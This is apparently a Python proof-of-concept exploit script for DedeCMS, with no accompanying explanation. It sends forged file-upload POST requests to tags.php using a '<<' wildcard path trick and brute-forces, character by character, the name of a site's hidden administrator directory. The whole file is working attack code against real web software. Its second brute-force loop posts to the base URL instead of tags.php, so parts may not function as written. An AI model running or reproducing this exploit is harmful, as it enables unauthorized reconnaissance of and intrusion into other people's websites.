import requests
import itertools
from termcolor import cprint

class FindAdmin:

    def __init__(self,url):
        self.url = url

    def findadmin(self):
        try:
            characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
            back_dir = ""
            flag = 0
            if '://' not in self.url:
                self.url = 'http://' + self.url + '/'
            url = self.url
            vulnurl = url + "/tags.php"
            payload = '/dede'
            r = requests.get(url=url+payload)
            if r.status_code == 200:
                back_dir = url + payload
            else:
                data = {
                    "_FILES[mochazz][tmp_name]": "./{p}<</images/adminico.gif",
                    "_FILES[mochazz][name]": 0,
                    "_FILES[mochazz][size]": 0,
                    "_FILES[mochazz][type]": "image/gif"
                }
                for num in range(1, 7):
                    if flag:
                        break
                    for pre in itertools.permutations(characters, num):
                        pre = ''.join(list(pre))
                        data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=pre)
                        r = requests.post(vulnurl, data=data)
                        if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                            flag = 1
                            back_dir = pre
                            data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                            break
                        else:
                            data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                flag = 0
                for i in range(30):
                    if flag:
                        break
                    for ch in characters:
                        if ch == characters[-1]:
                            flag = 1
                            break
                        data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=back_dir + ch)
                        r = requests.post(url, data=data)
                        if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                            back_dir += ch
                            data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                            break
                        else:
                            data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"

            cprint("find dedeadmin is ：" + back_dir,"red")
        except:
            return False
